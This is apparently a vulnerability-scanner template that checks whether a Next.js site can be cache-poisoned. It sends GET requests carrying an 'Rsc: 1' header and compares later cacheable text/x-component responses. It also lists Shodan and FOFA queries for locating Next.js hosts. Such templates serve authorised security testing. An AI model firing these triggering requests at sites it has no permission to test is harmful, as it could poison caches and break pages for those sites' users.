http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200 && contains(content_type_2, 'text/x-component') && !contains(cache_control_2,
      'no-cache') && !contains(pragma_2, 'no-cache')
    - status_code_3 == 200 && contains(content_type_3, 'text/x-component') && !contains(cache_control_3,
      'no-cache') && !contains(pragma_3, 'no-cache')
    type: dsl
  raw:
  - 'GET /?cb={{rand}} HTTP/1.1

    Host: {{Hostname}}

    Priority: u=1

    Rsc: 1

    '
  - '@timeout: 10s

    GET /?cb={{rand}} HTTP/1.1

    Host: {{Hostname}}

    Priority: u=1

    Rsc: 1

    '
  - '@timeout: 10s

    GET /?cb={{rand}} HTTP/1.1

    Host: {{Hostname}}

    '
id: nextjs-rsc-cache
info:
  author: DhiyaneshDk
  description: 'Next.js is vulnerable to Cache Poisoning using RSC.

    '
  metadata:
    fofa-query: body="/_next/static"
    framework: node.js
    product: next.js
    shodan-query:
    - http.html:"/_next/static"
    - cpe:"cpe:2.3:a:zeit:next.js"
    vendor: vercel
    verified: true
  name: Next.js - Cache Poisoning
  reference:
  - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
  severity: high
  tags: nextjs,cache,vuln
variables:
  rand: '{{rand_text_numeric(5)}}'
